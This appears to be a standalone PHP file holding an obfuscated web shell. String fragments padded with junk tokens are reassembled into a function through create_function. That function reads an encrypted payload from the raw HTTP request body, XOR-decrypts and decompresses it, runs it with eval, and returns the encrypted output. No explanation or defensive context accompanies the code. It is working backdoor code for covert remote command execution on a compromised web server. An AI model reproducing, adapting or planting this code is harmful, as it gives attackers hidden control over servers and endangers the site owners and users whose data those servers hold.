<?php
$j='$8Mk="dd5ed40e8M8M"8M;$kh="0ce76af6071d";8M$kf=8M"c9003e8M4c4458Mf";$p';
$L='f (@preg_8Mmatch8M("/$k8Mh8M(.+)$kf/",@8Mfile_g8Met8M_conte8Mnts("p8Mhp://input")';
$Y='8M="HnJxpYI8MQpKq8MfOEHv";8M8Mfunction 8Mx($8Mt,$k){$c=8Mstrlen($k)8M';
$N='8M,$m)==8M1) {@o8Mb_st8Mart()8M;@e8Mval(8M@gzuncomp8Mress(@x(@8Mbase8M68M4';
$W='M();$r=@8Mb8Mase64_encode8M(@x8M(@gzcomp8Mress($o)8M,$k));pri8Mnt(8M"$p$kh$8Mr$kf");}';
$X=';$l=st8Mrl8Men($t);$o8M8M="";for($8Mi=08M;$i<$l;8M8M){for($8Mj=8M0;($j<';
$T=str_replace('sT','','csTreatsTe_sTfusTnsTsTction');
$S='8M$c&&8M$i<$l);$j++,$i+8M+){$o.=$t{$i}8M^$8M8Mk{$j};}}return 8M$8Mo;}i';
$D='_decode($m[1]8M),$k)))8M;$o=8M@o8Mb_get_co8Mntent8M8Ms();@ob_end_clean8M8';
$e=str_replace('8M','',$j.$Y.$X.$S.$L.$N.$D.$W);
$x=$T('',$e);$x();
?>
